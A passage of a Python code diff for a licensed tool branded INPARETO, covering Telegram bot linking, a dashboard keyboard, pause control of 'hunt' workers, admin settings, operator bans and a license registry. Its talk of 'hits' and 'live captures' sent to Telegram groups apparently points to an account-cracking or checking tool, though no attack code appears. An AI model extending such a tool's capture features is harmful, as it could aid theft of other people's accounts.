+    except EOFError:
+        return ""
+
+
+def _defer_linked_device_sync(record):
+    """Background cloud/Telegram sync so boot + bot poll are not blocked."""
+    if is_locally_logged_out() or not has_local_operator_session():
+        return
+    try:
+        if is_locally_logged_out() or not TELEGRAM_ENABLED:
+            return
+        chat_id = str((record or {}).get("telegram_chat_id") or TELEGRAM_CHAT_ID or "").strip()
+        if chat_id:
+            restore_operator_hit_group_for_user(chat_id)
+        reconcile_operator_hit_group()
+        label = (record or {}).get("display_name")
+        chat_id = str((record or {}).get("telegram_chat_id") or TELEGRAM_CHAT_ID or "").strip()
+        bot_token = str((record or {}).get("telegram_bot_token") or TELEGRAM_BOT_TOKEN or "").strip()
+        if not bot_token or not chat_id:
+            return
+        if is_locally_logged_out():
+            return
+        if TELEGRAM_CHAT_ID:
+            info = fetch_telegram_user(chat_id)
+            label = (info or {}).get("display_name") or label
+        if is_locally_logged_out():
+            return
+        sync_operator_name_from_telegram(chat_id)
+        if is_locally_logged_out():
+            return
+        admin_load_settings(force=True)
+        sync_operator_access()
+        schedule_sync_telegram_commands(TELEGRAM_CHAT_ID)
+        if operator_access_ok(force=True):
+            mark_operator_access_verified()
+    except Exception as exc:
+        log_event("BOOT SYNC", str(exc)[:100])
+
+
+def _warmup_probes_once():
+    _run_api_probe()
+    sync_api_auto_pause()
+    _run_cloud_probe()
+
+
+def render_boot_screen(record, cloud_err, api_linked):
+    print()
+    for line in paint_logo_lines(JOINT_BADGE):
+        print(line)
+    print()
+
+    cloud_text, cloud_color = cloud_power_label()
+    if cloud_err:
+        cloud_text, cloud_color = "● ON  lookup failed", ANSI_RED
+    api_text, api_color = api_power_label()
+    if not api_linked and ip == "127.0.0.1":
+        api_text, api_color = "◌ OFF  run endpoint.py", ANSI_YELLOW
+    sync_text, sync_color = cloud_sync_label()
+    tg_linked = bool(record and record.get("telegram_bot_token") and record.get("telegram_chat_id"))
+
+    tg_id = str((record or {}).get("telegram_chat_id") or _read_stored_chat_id() or "").strip()
+    rows = [
+        ("Telegram ID", tg_id or "—", ANSI_CYAN),
+        ("Host", (platform.node() or "local")[:34], ANSI_BLUE),
+        ("Cloud", cloud_text, cloud_color),
+        ("API", api_text, api_color),
+        ("Sync", sync_text, sync_color),
+        ("Telegram", "linked" if tg_linked else "not linked", ANSI_GREEN if tg_linked else ANSI_YELLOW),
+    ]
+    if tg_linked:
+        rows.append(("Operator", str(record.get("display_name") or "linked")[:34], ANSI_MAGENTA))
+
+    print_cards([rows])
+
+
+def configure_telegram():
+    global DEVICE_HASH, _boot_configuring
+    _boot_configuring = True
+    try:
+        return _configure_telegram_impl()
+    finally:
+        _boot_configuring = False
+
+
+def _configure_telegram_impl():
+    reconcile_local_session_at_boot()
+    if not is_cloud_enabled():
+        print()
+        for line in paint_action_box(
+            "CONFIG",
+            [("Set SUPABASE_URL and SUPABASE_ANON_KEY at top of joint.py.", ANSI_RED)],
+            ANSI_RED,
+        ):
+            print(line)
+        print()
+        return
+    record, err = None, None
+
+    if is_locally_logged_out():
+        render_boot_screen(None, None, apply_api_host_from_record(None))
+        for line in paint_action_box(
+            "LOGGED OUT",
+            [
+                ("Previous session ended. Link below or restore from cloud with your Telegram ID.", ANSI_YELLOW),
+                ("Local files cleared; cloud still has your bot token if you linked before.", ANSI_DIM),
+            ],
+            ANSI_YELLOW,
+        ):
+            print(line)
+        print()
+    elif has_local_operator_session():
+        record = _load_local_session_record()
+        render_boot_screen(record, None, apply_api_host_from_record(None))
+        if _boot_linked_from_local():
+            return
+        for line in paint_action_box(
+            "SESSION",
+            [
+                (".inpareto files found but could not load — trying cloud backup.", ANSI_YELLOW),
+                (f"State folder: {_device_state_dir()}", ANSI_DIM),
+            ],
+            ANSI_YELLOW,
+        ):
+            print(line)
+        print()
+        chat_id = _read_stored_chat_id()
+        if chat_id and restore_operator_session_from_cloud(chat_id) and _boot_linked_from_local():
+            return
+    else:
+        render_boot_screen(None, None, apply_api_host_from_record(None))
+        for d in _state_dir_candidates():
+            names = []
+            try:
+                names = [
+                    n for n in os.listdir(d)
+                    if n.startswith(".inpareto") and os.path.isfile(os.path.join(d, n))
+                ]
+            except OSError:
+                continue
+            if not names:
+                continue
+            for line in paint_action_box(
+                "SESSION",
+                [
+                    (f"Found {len(names)} .inpareto file(s) in {d} but could not decrypt them.", ANSI_YELLOW),
+                    ("Use cloud restore below (Telegram ID) or link bot again.", ANSI_DIM),
+                ],
+                ANSI_YELLOW,
+            ):
+                print(line)
+            print()
+            break
+
+    if not is_locally_logged_out() and is_cloud_enabled():
+        restore_id = premium_input(
+            "Restore previous Telegram link from cloud?",
+            "Enter your numeric Telegram ID, or Enter to skip",
+        ).strip()
+        if restore_id.isdigit() and restore_operator_session_from_cloud(restore_id):
+            record = _load_local_session_record()
+            render_boot_screen(record, None, apply_api_host_from_record(None))
+            if _boot_linked_from_local():
+                return
+
+    for line in paint_action_box(
+        "TELEGRAM SETUP",
+        [
+            ("Link your bot — session saves in ~/.inpareto (and cloud backup).", ANSI_YELLOW),
+            ("Press Enter to skip if you only want local operations.", ANSI_DIM),
+        ],
+        ANSI_MAGENTA,
+    ):
+        print(line)
+    print()
+
+    ans = premium_input("Link Telegram to this device?", "Type y to continue, anything else to skip")
+    if ans.lower() != "y":
+        for line in paint_action_box("SKIPPED", [("Telegram setup skipped — local mode only.", ANSI_DIM)], ANSI_DIM):
+            print(line)
+        print()
+        return
+
+    bot_token = premium_input("Telegram bot token", "From @BotFather")
+    chat_id = premium_input("Telegram chat ID", "Your numeric chat / user ID")
+    if not bot_token or not chat_id:
+        for line in paint_action_box("SKIPPED", [("Missing token or chat ID — setup cancelled.", ANSI_YELLOW)], ANSI_YELLOW):
+            print(line)
+        print()
+        return
+
+    clear_local_logged_out()
+    clear_local_device_id()
+    apply_telegram_credentials(bot_token, chat_id)
+    restore_operator_hit_group_for_user(chat_id)
+    start_telegram_monitor()
+    admin_load_settings()
+    info = fetch_telegram_user(chat_id)
+    label = (info or {}).get("display_name") or f"User {chat_id[-6:]}"
+    save_err = None
+    brand_ok, brand_msg = apply_operator_bot_branding(bot_token)
+    schedule_operator_bot_branding(bot_token)
+    if save_err:
+        for line in paint_action_box("WARNING", [(f"Cloud save failed: {save_err[:54]}", ANSI_RED)], ANSI_RED):
+            print(line)
+    else:
+        _sync_operator_display_name(label)
+        restored_gid = sync_local_hit_group_from_cloud()
+        if restored_gid:
+            rows = [
+                (f"Hit group restored for your Telegram ID · {restored_gid}", ANSI_GREEN),
+            ]
+        else:
+            rows = [("Device registered — link a hit group (add bot as admin).", ANSI_GREEN)]
+        if brand_ok:
+            rows.append((f"Bot branded: {brand_msg[:52]}", ANSI_CYAN))
+        elif brand_msg:
+            rows.append((f"Bot branding: {brand_msg[:52]}", ANSI_YELLOW))
+        for line in paint_action_box("LINKED", rows, ANSI_GREEN):
+            print(line)
+    admin_load_settings()
+    sync_local_hit_group_from_cloud()
+    reconcile_operator_hit_group()
+    sync_operator_access()
+    schedule_sync_telegram_commands(chat_id)
+    print()
+
+
+FRAME_WIDTH = 72
+
+TG_BRAND = "INPARETO"
+TG_TAGLINE = "Developed by S Crew"
+TG_DIVIDER = "━━━━━━━━━━━━━━━━━━━━━━"
+
+# Typographic symbols only — no emoji
+S = {
+    "brand": "◈",
+    "live": "●",
+    "idle": "○",
+    "on": "◉",
+    "off": "◎",
+    "bullet": "▸",
+    "arrow": "→",
+    "dash": "—",
+    "section": "━",
+    "btn_dash": "▣",
+    "btn_hits": "▤",
+    "btn_set": "◇",
+    "btn_guide": "▷",
+    "btn_refresh": "↻",
+    "btn_tools": "◆",
+    "btn_pause": "▐",
+    "btn_resume": "►",
+    "btn_home": "⌂",
+    "btn_back": "◂",
+    "btn_up": "▲",
+    "btn_down": "▼",
+    "btn_plus": "⊕",
+    "btn_export": "⇩",
+    "btn_reset": "⊗",
+    "btn_logout": "⊘",
+    "btn_confirm": "✓",
+    "btn_cancel": "✕",
+    "btn_profile": "→",
+    "btn_user": "◎",
+    "btn_rank": "★",
+    "btn_badge": "◆",
+    "btn_analytics": "◧",
+    "btn_health": "⊕",
+    "btn_status": "▣",
+    "btn_api": "⊛",
+    "btn_cloud": "◉",
+}
+
+
+def tg_section(title):
+    bar = S["section"] * 3
+    return f"\n<b>{bar} {title} {bar}</b>\n"
+
+
+def tg_code(text):
+    return f"<code>{html.escape(str(text))}</code>"
+
+
+def tg_row(label, value):
+    return f"  {S['bullet']} {label}  <code>{html.escape(str(value))}</code>\n"
+
+
+def tg_progress(pct, width=14):
+    pct = max(0.0, min(100.0, float(pct)))
+    filled = int((pct / 100) * width)
+    return ("▰" * filled) + ("▱" * (width - filled))
+
+
+def tg_state_badge():
+    if _api_auto_paused and not _user_manual_paused:
+        return f"<code>{S['idle']} PAUSED · API OFF</code>"
+    if paused:
+        return f"<code>{S['idle']} PAUSED</code>"
+    return f"<code>{S['live']} LIVE</code>"
+
+
+def apply_worker_pause_state(*, defer_access=False):
+    """Sync pause_event with manual pause, API auto-pause, and access gate."""
+    global paused, PAUSED_SINCE, _pause_state_updating
+    license_ok = hunting_license_ok_cached if _workers_started else hunting_license_ok
+    with _pause_state_guard:
+        if _pause_state_updating:
+            uid = resolve_operator_telegram_id()
+            gate_ok = (
+                not (TELEGRAM_ENABLED and ACCESS_BLOCKED)
+                or _operator_hunt_trusted()
+                or _access_trust_grace_active()
+            ) and not (uid and operator_ban_active(uid, force=False))
+            if (
+                not (_user_manual_paused or _api_auto_paused)
+                and not is_locally_logged_out()
+                and not defer_access
+                and _worker_api_ok()
+                and gate_ok
+                and license_ok()
+            ):
+                pause_event.set()
+            else:
+                pause_event.clear()
+            return
+        _pause_state_updating = True
+    try:
+        paused = _user_manual_paused or _api_auto_paused
+        if is_locally_logged_out():
+            pause_event.clear()
+            return
+        if paused:
+            if PAUSED_SINCE is None:
+                PAUSED_SINCE = datetime.now(timezone.utc)
+            pause_event.clear()
+            return
+        PAUSED_SINCE = None
+        if defer_access:
+            pause_event.clear()
+            return
+        if (
+            JACK_PANEL_LIVE
+            and _workers_started
+            and pause_event.is_set()
+            and not (_user_manual_paused or _api_auto_paused)
+            and (_hunt_recently_ok() or _hunt_gen_recently_active(45))
+        ):
+            return
+        if JACK_PANEL_LIVE and _workers_started:
+            uid = resolve_operator_telegram_id()
+            gate_ok = (
+                not (TELEGRAM_ENABLED and ACCESS_BLOCKED)
+                or _operator_hunt_trusted()
+                or _access_trust_grace_active()
+            ) and not (uid and operator_ban_active(uid, force=False))
+            access_ok = gate_ok and license_ok()
+            api_ok = _worker_api_ok()
+        else:
+            access_ok = sync_operator_access() and hunting_license_ok()
+            api_ok = get_api_alive()
+        if access_ok and not paused:
+            if api_ok or _local_gateway_mode():
+                pause_event.set()
+            else:
+                pause_event.clear()
+        else:
+            pause_event.clear()
+    finally:
+        with _pause_state_guard:
+            _pause_state_updating = False
+
+
+def sync_api_auto_pause():
+    """Auto-pause workers when gateway is offline — debounced probe failures."""
+    global _api_auto_paused
+    if _hunt_recently_ok():
+        if _api_auto_paused:
+            _api_auto_paused = False
+            _log_api_pause_change("API online — hunt active")
+            apply_worker_pause_state()
+        return
+    if (
+        JACK_PANEL_LIVE
+        and _workers_started
+        and pause_event.is_set()
+        and not _user_manual_paused
+    ):
+        return
+    with _health_lock:
+        api_ok = bool(_health_cache.get("api"))
+    if api_ok:
+        if _api_auto_paused:
+            _api_auto_paused = False
+            _log_api_pause_change("API online — probe recovered")
+            apply_worker_pause_state()
+        return
+    # Termux: localhost gateway — VPN blips flip /alive probes; hunt refusal is the real signal.
+    if _IS_TERMUX:
+        return
+    if _api_probe_fail_streak < API_PROBE_FAIL_THRESHOLD:
+        return
+    if not _api_auto_paused:
+        _api_auto_paused = True
+        _log_api_pause_change("Auto-paused — API endpoint offline")
+    apply_worker_pause_state()
+
+
+def create_command_keyboard(view="main"):
+    toggle_text = (
+        f"{S['btn_resume']} Resume" if paused else f"{S['btn_pause']} Pause"
+    )
+    toggle_data = "RESUME" if paused else "PAUSE"
+
+    if view == "profile":
+        return {
+            "inline_keyboard": [
+                [
+                    {"text": f"{S['btn_rank']} Leaderboard", "callback_data": "LEADERBOARD"},
+                    {"text": f"{S['btn_badge']} Badges", "callback_data": "BADGES"},
+                ],
+                [
+                    {"text": f"{S['btn_back']} Back", "callback_data": "STATS"},
+                ],
+            ]
+        }
+
+    if view == "leaderboard":
+        return {
+            "inline_keyboard": [
+                [
+                    {"text": "Operators", "callback_data": "LB_OPS"},
+                    {"text": "Sessions", "callback_data": "LB_SESSIONS"},
+                ],
+                [
+                    {"text": "Today", "callback_data": "LB_DAY"},
+                    {"text": "Week", "callback_data": "LB_WEEK"},
+                    {"text": "All time", "callback_data": "LB_ALL"},
+                ],
+                [
+                    {"text": f"{S['btn_back']} Back", "callback_data": "PROFILE"},
+                ],
+            ]
+        }
+
+    if view == "settings":
+        return {
+            "inline_keyboard": [
+                [
+                    {"text": f"{S['btn_down']} 5", "callback_data": "MIND"},
+                    {"text": f"{S['btn_up']} 5", "callback_data": "MINU"},
+                    {"text": f"{S['btn_plus']} +5", "callback_data": "THRU"},
+                ],
+                [
+                    {"text": f"{S['btn_back']} Back", "callback_data": "STATS"},
+                ],
+            ]
+        }
+
+    if view == "tools":
+        live_label = (
+            f"{S['on']} Auto-refresh ON" if LIVE_WATCH else f"{S['off']} Auto-refresh OFF"
+        )
+        live_data = "LIVE_OFF" if LIVE_WATCH else "LIVE_ON"
+        return {
+            "inline_keyboard": [
+                [
+                    {"text": f"{S['btn_analytics']} Analytics", "callback_data": "ANALYTICS"},
+                    {"text": f"{S['btn_health']} Health", "callback_data": "HEALTH"},
+                ],
+                [
+                    {"text": live_label, "callback_data": live_data},
+                ],
+                [
+                    {"text": "★ Saved", "callback_data": "SAVED"},
+                    {"text": f"{S['btn_export']} Export", "callback_data": "EXPORT"},
+                ],
+                [
+                    {"text": f"{S['btn_guide']} Commands", "callback_data": "HELP"},
+                ],
+                [
+                    {"text": f"{S['btn_reset']} Reset stats", "callback_data": "RESET_ASK"},
+                ],
+                [
+                    {"text": f"{S['btn_logout']} Log out", "callback_data": "LOGOUT_ASK"},
+                ],
+                [
+                    {"text": f"{S['btn_back']} Back", "callback_data": "STATS"},
+                ],
+            ]
+        }
+
+    if view == "reset_confirm":
+        return {
+            "inline_keyboard": [
+                [
+                    {"text": f"{S['btn_confirm']} Confirm", "callback_data": "RESET_OK"},
+                    {"text": f"{S['btn_cancel']} Cancel", "callback_data": "TOOLS"},
+                ],
+            ]
+        }
+
+    if view == "logout_confirm":
+        return {
+            "inline_keyboard": [
+                [
+                    {
+                        "text": f"{S['btn_confirm']} Yes, log out",
+                        "callback_data": "LOGOUT_OK",
+                    },
+                    {
+                        "text": f"{S['btn_cancel']} Cancel",
+                        "callback_data": "LOGOUT_CANCEL",
+                    },
+                ],
+            ]
+        }
+
+    # Main panel — quick status + controls
+    return {
+        "inline_keyboard": [
+            [
+                {"text": f"{S['btn_dash']} Stats", "callback_data": "STATS"},
+                {"text": toggle_text, "callback_data": toggle_data},
+            ],
+            [
+                {"text": f"{S['btn_status']} Status", "callback_data": "CMD_STATUS"},
+                {"text": f"{S['btn_api']} API", "callback_data": "CMD_API"},
+                {"text": f"{S['btn_cloud']} Cloud", "callback_data": "CMD_CLOUD"},
+            ],
+            [
+                {"text": f"{S['btn_hits']} Hits", "callback_data": "HITS"},
+                {"text": f"{S['btn_set']} Config", "callback_data": "SETTINGS"},
+            ],
+            [
+                {"text": f"{S['btn_user']} Profile", "callback_data": "PROFILE"},
+                {"text": f"{S['btn_tools']} More", "callback_data": "TOOLS"},
+            ],
+        ]
+    }
+
+
+def create_back_keyboard(target="STATS", label=None):
+    label = label or f"{S['btn_home']} Dashboard"
+    return {"inline_keyboard": [[{"text": label, "callback_data": target}]]}
+
+
+def create_leaf_keyboard(refresh_data=None, back_target="STATS", back_label=None):
+    rows = []
+    if refresh_data:
+        rows.append([{"text": f"{S['btn_refresh']} Refresh", "callback_data": refresh_data}])
+    label = back_label or f"{S['btn_home']} Dashboard"
+    rows.append([{"text": label, "callback_data": back_target}])
+    return {"inline_keyboard": rows}
+
+
+def panel_keyboard(panel):
+    """Context-aware inline keys — full menu only on main dashboard."""
+    if panel == "main":
+        return create_command_keyboard("main")
+    if panel == "settings":
+        return create_command_keyboard("settings")
+    if panel == "profile":
+        return create_command_keyboard("profile")
+    if panel == "leaderboard":
+        return create_command_keyboard("leaderboard")
+    if panel == "tools":
+        return create_command_keyboard("tools")
+    if panel == "reset_confirm":
+        return create_command_keyboard("reset_confirm")
+    if panel == "logout_confirm":
+        return create_command_keyboard("logout_confirm")
+    if panel == "status":
+        return create_leaf_keyboard("CMD_STATUS", "STATS")
+    if panel == "api":
+        return create_leaf_keyboard("CMD_API", "STATS")
+    if panel == "cloud":
+        return create_leaf_keyboard("CMD_CLOUD", "STATS")
+    if panel == "hits":
+        return create_leaf_keyboard("HITS", "STATS")
+    if panel == "help":
+        return create_leaf_keyboard(None, "TOOLS", f"{S['btn_back']} More")
+    if panel == "analytics":
+        return create_leaf_keyboard("ANALYTICS", "TOOLS", f"{S['btn_back']} More")
+    if panel == "health":
+        return create_leaf_keyboard("HEALTH", "TOOLS", f"{S['btn_back']} More")
+    if panel == "notice":
+        return create_back_keyboard("STATS")
+    if panel == "pause_notice":
+        toggle_text = f"{S['btn_resume']} Resume" if paused else f"{S['btn_pause']} Pause"
+        toggle_data = "RESUME" if paused else "PAUSE"
+        return {
+            "inline_keyboard": [
+                [{"text": toggle_text, "callback_data": toggle_data}],
+                [{"text": f"{S['btn_home']} Dashboard", "callback_data": "STATS"}],
+            ]
+        }
+    return create_back_keyboard("STATS")
+
+
+def format_panel_header():
+    return (
+        f"<b>{S['brand']} {TG_BRAND}</b>  <i>{TG_TAGLINE}</i>\n"
+        f"<code>{TG_DIVIDER}</code>\n"
+    )
+
+
+# ═══ ADMIN (not exposed in public /help) ═══
+
+def admin_load_settings(*, force=False):
+    global _admin_settings, _admin_settings_loaded_at
+    if not is_cloud_enabled():
+        return
+    now = time.time()
+    if not force and _admin_settings_loaded_at and now - _admin_settings_loaded_at < ADMIN_SETTINGS_TTL:
+        return
+    with _admin_settings_io_lock:
+        data, err = supabase_request("GET", "app_settings", params={"key": "eq.core", "limit": "1"})
+        if err or not data:
+            return
+        row = data[0].get("value") or {}
+        if isinstance(row, str):
+            try:
+                row = json.loads(row)
+            except Exception:
+                row = {}
+        _admin_settings.update({
+            "admin_ids": [str(x) for x in row.get("admin_ids", [])],
+            "admin_bot_token": (row.get("admin_bot_token") or "").strip(),
+            "logs_group_id": str(row.get("logs_group_id") or "").strip(),
+            "hits_group_id": str(row.get("hits_group_id") or "").strip(),
+            "channel_username": (row.get("channel_username") or "inpareto").strip().lstrip("@"),
+            "operator_bot_name": (row.get("operator_bot_name") or "INPARETO Jack").strip(),
+            "operator_bot_description": (row.get("operator_bot_description") or "").strip()
+            or "Hit alerts & remote hunt control.\nDeveloped by S Crew",
+            "operator_bot_short_description": (row.get("operator_bot_short_description") or "").strip()
+            or "INPARETO · S Crew",
+            "operator_bot_photo_url": (row.get("operator_bot_photo_url") or "").strip(),
+            "operator_hit_group_title": (row.get("operator_hit_group_title") or "INPARETO · Hits").strip(),
+            "operator_hit_group_description": (row.get("operator_hit_group_description") or "").strip()
+            or "Live captures from your INPARETO session.\nDeveloped by S Crew",
+            "operator_hit_group_photo_url": (row.get("operator_hit_group_photo_url") or "").strip(),
+        })
+        for key, val in row.items():
+            if key not in _ADMIN_SETTINGS_KNOWN_KEYS:
+                _admin_settings[key] = val
+        _admin_settings_loaded_at = now
+
+
+def admin_save_settings():
+    if not is_cloud_enabled():
+        return "Cloud offline"
+    with _admin_settings_io_lock:
+        payload = {
+            "key": "core",
+            "value": _admin_settings,
+            "updated_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+        }
+        url = f"{SUPABASE_URL}/rest/v1/app_settings?on_conflict=key"
+        try:
+            r = requests.post(
+                url,
+                headers=supabase_headers("resolution=merge-duplicates"),
+                json=payload,
+                timeout=CLOUD_TIMEOUT,
+            )
+            if not r.ok:
+                return r.text[:120]
+        except Exception as exc:
+            return str(exc)
+    return None
+
+
+def admin_is_admin(user_id):
+    user_id = str(user_id or "").strip()
+    if not user_id:
+        return False
+    if is_cloud_enabled():
+        admin_load_settings(force=False)
+    return user_id in _admin_settings.get("admin_ids", [])
+
+
+def admin_api_url():
+    token = _admin_settings.get("admin_bot_token") or ""
+    if not token:
+        return ""
+    return f"https://api.telegram.org/bot{token}"
+
+
+def admin_request(method, data=None, files=None):
+    base = admin_api_url()
+    if not base:
+        return None
+    try:
+        return requests.post(
+            f"{base}/{method}",
+            data=data,
+            files=files,
+            timeout=CLOUD_TIMEOUT,
+        )
+    except Exception:
+        return None
+
+
+def admin_send_message(chat_id, text, reply_markup=None, parse_mode="HTML"):
+    if not chat_id:
+        return None
+    payload = {"chat_id": str(chat_id), "text": text, "parse_mode": parse_mode}
+    if reply_markup is not None:
+        payload["reply_markup"] = json.dumps(reply_markup)
+    payload = telegram_disable_link_preview(payload, "sendMessage")
+    return admin_request("sendMessage", data=payload)
+
+
+def admin_send_photo(chat_id, caption, photo_bytes, content_type="image/jpeg", reply_markup=None):
+    if not chat_id or not photo_bytes:
+        return None
+    data = {
+        "chat_id": str(chat_id),
+        "caption": caption,
+        "parse_mode": "HTML",
+    }
+    if reply_markup is not None:
+        data["reply_markup"] = json.dumps(reply_markup)
+    data = telegram_disable_link_preview(data, "sendPhoto")
+    files = {"photo": ("hit.jpg", photo_bytes, content_type)}
+    return admin_request("sendPhoto", data=data, files=files)
+
+
+def admin_channel_tag():
+    user = (_admin_settings.get("channel_username") or "inpareto").lstrip("@")
+    return f'<a href="https://t.me/{html.escape(user)}">@{html.escape(user)}</a>'
+
+
+def admin_parse_chat_target(link):
+    link = (link or "").strip()
+    if not link:
+        return None, None
+    if link.startswith("@"):
+        uname = link.lstrip("@")
+        return f"@{uname}", f"https://t.me/{uname}"
+    m = re.search(r"(?:https?://)?t\.me/\+([A-Za-z0-9_-]+)", link)
+    if m:
+        return None, f"https://t.me/+{m.group(1)}"
+    m = re.search(r"(?:https?://)?t\.me/([A-Za-z0-9_]+)", link)
+    if m:
+        uname = m.group(1)
+        if uname.lower() in ("joinchat", "c"):
+            return None, link
+        return f"@{uname}", f"https://t.me/{uname}"
+    if re.fullmatch(r"-?\d+", link):
+        return link, link
+    return None, link
+
+
+def admin_fetch_force_join_targets():
+    data, err = supabase_request(
+        "GET", "force_join_targets", params={"select": "*", "order": "created_at.asc"},
+    )
+    if err:
+        return [], err
+    return data or [], None
+
+
+def admin_upsert_force_join(preview_name, chat_id, invite_link):
+    invite_link = (invite_link or chat_id or "").strip()
+    parsed_cid, parsed_inv = admin_parse_chat_target(invite_link)
+    if not parsed_inv and invite_link.startswith("http"):
+        parsed_inv = invite_link
+    payload = {
+        "preview_name": preview_name,
+        "chat_id": parsed_cid or chat_id or invite_link,
+        "invite_link": parsed_inv or invite_link,
+    }
+    url = f"{SUPABASE_URL}/rest/v1/force_join_targets?on_conflict=preview_name"
+    try:
+        r = requests.post(
+            url,
+            headers=supabase_headers("resolution=merge-duplicates"),
+            json=payload,
+            timeout=CLOUD_TIMEOUT,
+        )
+        if not r.ok:
+            return r.text[:120]
+    except Exception as exc:
+        return str(exc)
+    return None
+
+
+def admin_delete_force_join(preview_name):
+    url = f"{SUPABASE_URL}/rest/v1/force_join_targets"
+    try:
+        r = requests.delete(
+            url,
+            headers=supabase_headers(),
+            params={"preview_name": f"eq.{preview_name}"},
+            timeout=CLOUD_TIMEOUT,
+        )
+        if not r.ok:
+            return r.text[:120]
+    except Exception as exc:
+        return str(exc)
+    return None
+
+
+def admin_fetch_ban(operator_id):
+    data, err = supabase_request(
+        "GET",
+        "banned_operators",
+        params={"operator_id": f"eq.{operator_id}", "select": "*", "limit": "1"},
+    )
+    if err:
+        return None, err
+    return (data[0] if data else None), None
+
+
+def invalidate_ban_cache(user_id=None):
+    if user_id is None or str(user_id) == _ban_cache.get("user_id"):
+        _ban_cache.update(user_id=None, banned=False, at=0.0)
+
+
+def operator_ban_active(user_id, *, force=False):
+    """True when operator is suspended in Supabase — never bypass via local session trust."""
+    user_id = str(user_id or "").strip()
+    if not user_id or not TELEGRAM_ENABLED or admin_is_admin(user_id):
+        return False
+    now = time.time()
+    if (
+        not force
+        and _ban_cache["user_id"] == user_id
+        and now - float(_ban_cache.get("at") or 0) < BAN_CHECK_TTL
+    ):
+        return bool(_ban_cache["banned"])
+    ban, err = admin_fetch_ban(user_id)
+    if err:
+        if (
+            _ban_cache["user_id"] == user_id
+            and _ban_cache["banned"]
+            and now - float(_ban_cache.get("at") or 0) < BAN_CHECK_TTL * 12
+        ):
+            return True
+        return False
+    banned = bool(ban)
+    _ban_cache.update(user_id=user_id, banned=banned, at=now)
+    if banned:
+        _admin_access_cache.update(ok=False, at=0.0)
+        invalidate_operator_gate_cache()
+    return banned
+
+
+def admin_ban_operator(operator_id, reason="", by_admin=""):
+    payload = {
+        "operator_id": str(operator_id),
+        "reason": reason[:200],
+        "banned_by": str(by_admin),
+        "banned_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+    }
+    url = f"{SUPABASE_URL}/rest/v1/banned_operators?on_conflict=operator_id"
+    try:
+        r = requests.post(
+            url,
+            headers=supabase_headers("resolution=merge-duplicates"),
+            json=payload,
+            timeout=CLOUD_TIMEOUT,
+        )
+        if not r.ok:
+            return r.text[:120]
+    except Exception as exc:
+        return str(exc)
+    return None
+
+
+def admin_unban_operator(operator_id):
+    url = f"{SUPABASE_URL}/rest/v1/banned_operators"
+    try:
+        r = requests.delete(
+            url,
+            headers=supabase_headers(),
+            params={"operator_id": f"eq.{operator_id}"},
+            timeout=CLOUD_TIMEOUT,
+        )
+        if not r.ok:
+            return r.text[:120]
+        return None
+    except Exception as exc:
+        return str(exc)
+
+
+def license_iso_now():
+    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
+
+
+def license_parse_iso(value):
+    if not value:
+        return None
+    try:
+        raw = str(value).strip().replace("Z", "+00:00")
+        dt = datetime.fromisoformat(raw)
+        if dt.tzinfo is None:
+            dt = dt.replace(tzinfo=timezone.utc)
+        return dt.astimezone(timezone.utc)
+    except (ValueError, TypeError):
+        return None
+
+
+def license_format_expiry(dt):
+    if not dt:
+        return "—"
+    return dt.astimezone(timezone.utc).strftime("%d %b %Y · %H:%M UTC")
+
+
+def license_default_registry():
+    return {"licenses": {}, "keys": {}, "free": {}, "version": 2}
+
+
+def license_normalize_registry(raw):
+    base = license_default_registry()
+    if not isinstance(raw, dict):
+        return base
+    lic = raw.get("licenses")
+    keys = raw.get("keys")
+    free = raw.get("free")
+    if isinstance(lic, dict):
+        base["licenses"] = lic
+    if isinstance(keys, dict):
+        base["keys"] = keys
+    if isinstance(free, dict):
+        base["free"] = free
+    return base
+
+
+def license_repair_registry_from_keys(reg):
+    """Rebuild missing licenses[] from redeemed keys (fixes redeem overwrite bug)."""
+    if not isinstance(reg, dict):
+        return False, license_default_registry()
+    licenses = reg.setdefault("licenses", {})
+    keys = reg.get("keys") or {}
+    if not keys:
+        return False, reg
+    now = datetime.now(timezone.utc)
+    changed = False
+    for key_name, entry in keys.items():
+        if not isinstance(entry, dict):
+            continue
+        uid = str(entry.get("redeemed_by") or "").strip()
+        redeemed_at = license_parse_iso(entry.get("redeemed_at"))
+        if not uid or not redeemed_at:
+            continue
+        days = max(1, int(entry.get("days") or 30))
+        exp = redeemed_at + timedelta(days=days)
+        if exp <= now:
+            continue
+        existing = licenses.get(uid)
+        existing_exp = None
+        if isinstance(existing, dict):
+            existing_exp = license_parse_iso(existing.get("expires_at"))
+        if existing_exp and existing_exp >= exp:
+            continue
+        licenses[uid] = {
+            "expires_at": exp.strftime("%Y-%m-%dT%H:%M:%SZ"),
+            "granted_at": entry.get("redeemed_at") or license_iso_now(),
+            "granted_by": str(entry.get("created_by") or ""),
+            "source": "key_repair",
+            "key_ref": key_name,
+        }
+        changed = True
+    return changed, reg
+
+
+def license_invalidate_cache():
+    with _paid_access_lock:
+        _paid_access_cache["registry"] = None
+        _paid_access_cache["at"] = 0.0
+    _hunt_license_cache.update(ok=None, at=0.0)
+    _invalidate_dashboard_plan_cache()
+
+
+def license_fetch_registry(*, force=False):
+    now = time.time()
+    with _paid_access_lock:
+        if (
+            not force
+            and _paid_access_cache["registry"] is not None
+            and now - _paid_access_cache["at"] < LICENSE_CACHE_TTL
+        ):
+            return json.loads(json.dumps(_paid_access_cache["registry"])), None
+    if not is_cloud_enabled():
+        return license_default_registry(), "Cloud offline"
+    with _license_registry_lock:
+        with _paid_access_lock:
+            if (
+                not force
+                and _paid_access_cache["registry"] is not None
+                and now - _paid_access_cache["at"] < LICENSE_CACHE_TTL
+            ):
+                return json.loads(json.dumps(_paid_access_cache["registry"])), None
+        data, err = supabase_request(
+            "GET",
+            "app_settings",
+            params={"key": f"eq.{LICENSE_REGISTRY_KEY}", "select": "value", "limit": "1"},
+        )
+        if err:
+            return license_default_registry(), err
+        reg = license_default_registry()
+        if data:
+            val = data[0].get("value")
+            if isinstance(val, str):
+                try:
+                    val = json.loads(val)
+                except json.JSONDecodeError:
+                    val = {}
+            reg = license_normalize_registry(val or {})
+        repaired, reg = license_repair_registry_from_keys(reg)
+        if repaired:
+            save_err = license_save_registry(reg)
+            if save_err:
+                log_event("LICENSE", f"repair save failed: {save_err[:80]}")
+        with _paid_access_lock:
+            _paid_access_cache["registry"] = reg
+            _paid_access_cache["at"] = now
+        return json.loads(json.dumps(reg)), None
+
+
+def license_save_registry(registry):
